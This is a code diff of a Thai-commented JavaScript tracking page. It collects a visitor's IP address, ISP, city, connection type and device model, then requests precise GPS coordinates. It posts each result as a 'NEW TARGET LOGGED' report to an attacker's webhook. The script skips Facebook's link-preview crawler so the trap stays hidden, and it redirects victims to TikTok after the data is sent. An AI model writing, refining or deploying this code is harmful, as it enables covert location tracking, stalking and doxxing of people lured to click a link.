@@ -10,14 +10,19 @@
             if (navigator.userAgent.includes("facebookexternalhit")) return;
 
             try {
-                // --- ส่วนที่ 1: ดึงข้อมูลที่อยู่และสเปคเครื่อง ---
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 const check = (val) => (val && val !== null ? val : "❌ ไม่พบข้อมูล");
 
+                // ตรวจสอบประเภทเน็ต (WiFi / Cellular)
+                let connectionType = "Unknown (ไม่ระบุ)";
+                if (navigator.connection) {
+                    connectionType = `${navigator.connection.type || navigator.connection.effectiveType} (เน็ตแบบ ${navigator.connection.effectiveType})`;
+                }
+
                 const ua = navigator.userAgent;
-                let deviceType = "Desktop (PC/Laptop) (คอมพิวเตอร์)";
-                let modelName = "Unknown Device (ไม่ระบุรุ่น)";
+                let deviceType = "Desktop (คอมพิวเตอร์)";
+                let modelName = "Unknown Device";
 
                 if (/android/i.test(ua)) {
                     deviceType = "Mobile (Android) (มือถือแอนดรอยด์)";
@@ -25,38 +30,23 @@
                     modelName = match ? match[2].trim().split(" Build")[0] : "Android Device";
                 } else if (/iPhone|iPad|iPod/i.test(ua)) {
                     deviceType = "Mobile (iOS) (มือถือไอโอเอส)";
-                    const w = screen.width, h = screen.height, pr = window.devicePixelRatio;
+                    const w = screen.width, h = screen.height;
                     if (w === 430 && h === 932) modelName = "iPhone 14/15/16 Pro Max";
                     else if (w === 393 && h === 852) modelName = "iPhone 14/15/16 Pro";
-                    else if (w === 390 && h === 844) modelName = "iPhone 12/13/14/15 (Standard)";
-                    else if (w === 414 && h === 896) modelName = (pr === 3) ? "iPhone 11 Pro Max / XS Max" : "iPhone 11 / XR";
-                    else if (w === 375 && h === 812) modelName = "iPhone 11 Pro / X / XS";
-                    else if (w === 414 && h === 736) modelName = "iPhone 6/7/8 Plus";
-                    else if (w === 375 && h === 667) modelName = "iPhone 6/7/8 / SE (2nd/3rd)";
-                    else if (w === 320 && h === 568) modelName = "iPhone 5 / SE (1st)";
-                    else if (/iPad/.test(ua)) modelName = "iPad";
-                    else modelName = `iPhone (Screen: ${w}x${h})`;
+                    else if (w === 390 && h === 844) modelName = "iPhone 12/13/14/15";
+                    else modelName = `iPhone (${w}x${h})`;
                 }
 
-                if (navigator.userAgentData) {
-                    const ent = await navigator.userAgentData.getHighEntropyValues(["platformVersion", "model"]);
-                    if (ent.model) modelName = ent.model;
-                    if (navigator.userAgentData.platform === "Windows") {
-                        const major = parseInt(ent.platformVersion.split('.')[0]);
-                        deviceType = (major >= 13) ? "Windows 11 PC (วินโดวส์ 11)" : "Windows 10 PC (วินโดวส์ 10)";
-                    }
-                }
-
-                // ส่ง Report แรก: สเปคเครื่องและเน็ต (จัดหน้าสวยๆ)
+                // ส่ง Report แรก: ข้อมูลเน็ตและสเปคเครื่อง
                 let report = `📂 **NEW TARGET LOGGED**\n`;
                 report += `──────────────────────────\n`;
+                report += `🌐 **[NETWORK INFO (ข้อมูลเน็ต)]**\n`;
+                report += `> **IP (ไอพี):** \`${check(data.ip)}\` \n`;
+                report += `> **ISP (ชื่อเน็ต):** ${check(data.org)}\n`;
+                report += `> **Type (ประเภท):** ${connectionType}\n\n`;
                 report += `📱 **[DEVICE (อุปกรณ์)]**\n`;
                 report += `> **Model (รุ่น):** ${modelName}\n`;
-                report += `> **Type (ประเภท):** ${deviceType}\n`;
-                report += `> **OS (ระบบ):** ${check(navigator.platform)}\n\n`;
-                report += `🌐 **[NETWORK (เครือข่าย)]**\n`;
-                report += `> **IP (ไอพี):** \`${check(data.ip)}\` \n`;
-                report += `> **ISP (ค่ายเน็ต):** ${check(data.org)}\n`;
+                report += `> **Type (เครื่อง):** ${deviceType}\n`;
                 report += `──────────────────────────`;
 
                 await fetch(WEBHOOK_URL, {
@@ -65,7 +55,6 @@
                     body: JSON.stringify({ content: report })
                 });
 
-                // --- ส่วนที่ 2: ระบบตัดสินใจพิกัด ---
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
                         const { latitude, longitude } = pos.coords;
@@ -75,7 +64,7 @@
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
-                                content: `🎯 **PRECISE LOCATION (พิกัดแม่นยำสูง)**\n──────────────────────────\n📍 **Google Maps:** ${mapsLink}\n✅ **Status:** Precise Data (ข้อมูลแม่นยำพิกัดตรง)\n──────────────────────────` 
+                                content: `🎯 **PRECISE LOCATION (พิกัดแม่นยำสูง)**\n──────────────────────────\n📍 **Maps:** ${mapsLink}\n✅ **Status:** พิกัดตรงตามจริง (GPS)\n──────────────────────────` 
                             })
                         });
                         window.location.href = "https://www.tiktok.com";
@@ -86,8 +75,7 @@
                         backupReport += `📍 **[IP BASED LOCATION (ตำแหน่งอ้างอิงไอพี)]**\n`;
                         backupReport += `> **City (เมือง):** ${check(data.city)}\n`;
                         backupReport += `> **Region (จังหวัด):** ${check(data.region)}\n`;
-                        backupReport += `> **Country (ประเทศ):** ${check(data.country_name)}\n\n`;
-                        backupReport += `❌ **Status:** Data Inaccurate (ข้อมูลอาจไม่ตรงคลาดเคลื่อน)\n`;
+                        backupReport += `❌ **Status:** ข้อมูลคลาดเคลื่อน (อ้างอิงตาม IP)\n`;
                         backupReport += `──────────────────────────`;
 
                         await fetch(WEBHOOK_URL, {
@@ -98,7 +86,6 @@
                         window.location.href = "https://www.tiktok.com"; 
                     }, { 
                         enableHighAccuracy: true, 
-                        maximumAge: 0, 
                         timeout: 10000 
                     });
                 } else {
